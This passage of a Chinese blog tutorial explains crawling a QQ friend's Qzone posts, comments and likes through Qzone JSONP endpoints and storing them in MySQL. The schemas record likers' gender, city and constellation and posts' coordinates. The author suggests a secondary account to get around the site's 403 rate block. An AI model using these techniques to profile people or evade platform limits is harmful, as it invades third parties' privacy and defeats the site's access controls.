-需要特别注意的是，这个接口和上面两个不太一样，频繁访问会导致&lt;code&gt;403&lt;/code&gt;，所以若非必要，点赞部分不爬取也是可以的&amp;hellip;或者想一个避免403的方法，比如sleep，可这肯定会使整个程序慢下来，毕竟不敢贸然上多线程&amp;hellip;&lt;/p&gt;
-
-&lt;p&gt;一个小Tips: 点赞数据的获取是不一定要有好友关系的，也就是说可以用小号对赞同数另外爬取，避免被封号&amp;hellip;不是真正的封号，只是无法再访问这个地址了，一般是一天，泪的教训&amp;hellip;&lt;/p&gt;
-
-&lt;p&gt;通过上面第一个地址，可以得到一个好友的所有说说的&lt;code&gt;tid&lt;/code&gt;，根据每个&lt;code&gt;tid&lt;/code&gt;去获取它的详细内容和点赞情况，这样就能把所有说说爬下来了~&lt;/p&gt;
-
-&lt;h3 id=&#34;数据分析&#34;&gt;数据分析&lt;/h3&gt;
-
-&lt;p&gt;前面提到过了，说说和留言不一样，它除了内容本身，还有下面的评论，以及在评论下面的回复，它可能是互动双方，也有可能是第三个好友的回复(留言下面只能是双方的互动)，最后还有点赞的好友的情况&lt;/p&gt;
-
-&lt;p&gt;分析一下返回的数据，这是说说内容和评论内容，图片太长分两次截吧&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/T1o7g&#34; alt=&#34;moods&#34; /&gt;
-&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/vXyMM&#34; alt=&#34;moods&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;点赞的情况如下，乱码是因为网站本身的问题&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/s84i0&#34; alt=&#34;moods like&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;数据库设计&#34;&gt;数据库设计&lt;/h3&gt;
-
-&lt;p&gt;刚才提到了，说说的结构相对复杂，考虑到一张表无法将所有字段包括进去，于是设计了三张表，分别是说说内容表，评论及回复表，点赞表&lt;/p&gt;
-
-&lt;h4 id=&#34;说说表-qq-moods&#34;&gt;说说表&lt;code&gt;qq_moods&lt;/code&gt;&lt;/h4&gt;
-
-&lt;pre&gt;&lt;code&gt;create_tb_sql = &#39;CREATE TABLE IF NOT EXISTS %s\
-    (id int primary key, \
-    moodid varchar(30), \			#说说id
-    uin varchar(15), \				#发布者
-    nickname varchar(50), \			#发布者昵称
-    secret int(2), \				#有时候qq签名会同步为说说，设置为仅自己可见时该字段为1
-    pubtime varchar(20), \			#发布时间
-    phone varchar(30), \			#发布平台
-    content TEXT, \				#说说内容，注意TEXT
-    pictotal int(4), \				#图片总数
-    cmtnum int(4), \				#评论总数
-    fwdnum int(4), \				#转发总数
-    locate varchar(50), \			#地理位置
-    position varchar(50), \
-    pos_x varchar(20), \			#经纬度
-    pos_y varchar(20))&#39; % tablename
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;效果如下
-&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/WEMTS&#34; alt=&#34;moods table&#34; /&gt;&lt;/p&gt;
-
-&lt;h4 id=&#34;评论表-qq-moods-reply&#34;&gt;评论表&lt;code&gt;qq_moods_reply&lt;/code&gt;&lt;/h4&gt;
-
-&lt;pre&gt;&lt;code&gt;create_tb_sql = &#39;CREATE TABLE IF NOT EXISTS %s\
-    (id int primary key, \
-    moodid varchar(30), \			#说说id
-    cmtuin varchar(15), \			#评论者
-    cmtnickname varchar(80), \			#评论者昵称
-    cmtcount varchar(4), \			#该说说评论数
-    cmtpubtime varchar(20), \			#评论发布时间
-    comtcontent TEXT, \				#评论内容
-    replycount varchar(4), \			#该评论下的回复数
-    rpypubtime varchar(20), \			#回复发布时间
-    replycontent TEXT \				#回复内容
-    )&#39; % tablename
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可能有人会问，这怎么表示评论和回复之间的层次关系呢？不急，我们先来看一下效果&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/kmOxu&#34; alt=&#34;moods reply&#34; /&gt;
-通过对同一层次的评论和回复插入空值，可以表示出层次关系，这和留言部分是一样的&lt;/p&gt;
-
-&lt;h4 id=&#34;点赞表-qq-moods-like&#34;&gt;点赞表&lt;code&gt;qq_moods_like&lt;/code&gt;&lt;/h4&gt;
-
-&lt;pre&gt;&lt;code&gt;create_tb_sql = &#39;CREATE TABLE IF NOT EXISTS %s\
-    (id int primary key, \
-    moodid varchar(30), \			#说说id
-    likecount  varchar(6), \			#点赞总数
-    uin varchar(15), \				#点赞者
-    nickname varchar(50), \			#昵称
-    gender varchar(4), \			#性别
-    constellation varchar(10), \		#星座
-    addr varchar(10), \				#城市
-    if_qq_friend int(2), \			#是否是好友
-    if_special_care int(2) \			#是否特别关心
-    )&#39; % tablename
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;效果如下&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/DkbbK&#34; alt=&#34;moods like&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;同样的，同一说说的点赞适当插入空值可以表现出层次关系&lt;/p&gt;
-
-&lt;h3 id=&#34;核心代码&#34;&gt;核心代码&lt;/h3&gt;
-
-&lt;p&gt;考虑到数据解析本身难度并不大，但爬取的逻辑还是挺重要的，所以这里贴一部分关键的代码&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;while True:
-    url = &#39;https://h5.qzone.qq.com/proxy/domain/taotao.qq.com/cgi-bin/emotion_cgi_msglist_v6?uin=&#39;+ target_qq + &#39;&amp;amp;pos=&#39; + str(self.moodstatus[&#39;moodPos&#39;]) + &#39;&amp;amp;num=10&amp;amp;format=jsonp&amp;amp;g_tk=&#39; + g_tk
-    r = s.get(url, headers = header)
-    dict = self.data2json(r.content[10:-2].strip().replace(&#39;\n&#39;,&#39;&#39;))
-    if self.moodstatus[&#39;moodPos&#39;] &amp;lt; dict[&#39;usrinfo&#39;][&#39;msgnum&#39;] - 1:				#get 10 items at a time
-        self.moodstatus[&#39;moodPos&#39;] += 10
-        print &#39;current qq: %s, current pos: %s&#39; % (target_qq, str(self.moodstatus[&#39;moodPos&#39;]))
-    else:
-   		break
-
-    if dict[&#39;msglist&#39;] == None:
-        print u&#39;\n之前动态被封存，无法获取.&#39;
-        break
-
-    for item in dict[&#39;msglist&#39;]:
-        print &#39;get moodId: %s, moods tid: %s&#39; % (self.moodstatus[&#39;moodId&#39;], item[&#39;tid&#39;])
-        url = &#39;https://h5.qzone.qq.com/proxy/domain/taotao.qq.com/cgi-bin/emotion_cgi_msgdetail_v6?uin=&#39;+ target_qq + &#39;&amp;amp;tid=&#39;+ item[&#39;tid&#39;] + &#39;&amp;amp;format=jsonp&amp;amp;g_tk=&#39; + g_tk
-        r = s.get(url, headers = header)
-        data = self.data2json(r.content[10:-2].strip().replace(&#39;\n&#39;,&#39;&#39;).replace(&#39;\\&#39;,&#39;&#39;))
-
-        self.operate_db_moods(db, &#39;qq_moods&#39;, data)							#get moods details
-		
-        if item.has_key(&#39;commentlist&#39;):
-            self.operate_db_moods_reply(db, &#39;qq_moods_reply&#39;, data)			#get moods reply
-        self.get_moods_like(qq, target_qq, cookie, item[&#39;tid&#39;], db)			#get moods like
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h4 id=&#34;解释&#34;&gt;解释&lt;/h4&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;moodstatus&lt;/code&gt;是用来存放当前爬虫的状态的，便于程序意外中断后断点续爬。关于如何保存状态，如果有需要的话单独拿出来讲，这里只要关心这个&lt;code&gt;moodstatus&lt;/code&gt;包含的键值对就好了。&lt;code&gt;is_last_mood&lt;/code&gt;用来标识是否爬到了最后一条说说，下次爬取只要检测这个值就能判断是否继续了。
-&lt;code&gt;
-self.moodstatus = {&amp;quot;moodTid&amp;quot;: &#39;&#39;, &amp;quot;is_last_mood&amp;quot;: 0, &amp;quot;moodPos&amp;quot;: 0, &amp;quot;moodId&amp;quot;: 0, &amp;quot;moodcmtId&amp;quot;: 0, &amp;quot;moodlikeId&amp;quot;: 0}
-&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;data2json(data)&lt;/code&gt;是将&lt;code&gt;request&lt;/code&gt;获取的内容转换为&lt;code&gt;json&lt;/code&gt;对象
-&lt;code&gt;
-def data2json(self, data):
-json_obj = json.loads(data.decode(&#39;utf-8&#39;))
-return json_obj
-&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;operate_db*(self, db, tablename, data)&lt;/code&gt;方法是用来操作数据库的，有建表和插入数据的实现&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&#34;流程图&#34;&gt;流程图&lt;/h4&gt;
-
-&lt;p&gt;画了一个简单的流程图&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/pGVFE&#34; alt=&#34;get moods&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;结束语&#34;&gt;结束语&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;说说部分的代码比其他复杂一些，主要是信息相对较多，数据之间的关系也相对复杂，除了常规边界判断，特殊字符等，还要注意如何正确表示层次关系，以及爬虫状态的保存(谁也不想爬了几千条中断了然后重新开始爬= =)&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;分享一条查询Top 20评论数的sql语句，对于说说表，留言表也是是用的&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;SELECT cmtnickname, count(cmtnickname) AS count
-FROM qq_moods_reply
-WHERE cmtnickname != &#39;&#39;
-GROUP BY cmtnickname
-ORDER BY count DESC
-LIMIT 20
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-&lt;/ul&gt;
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
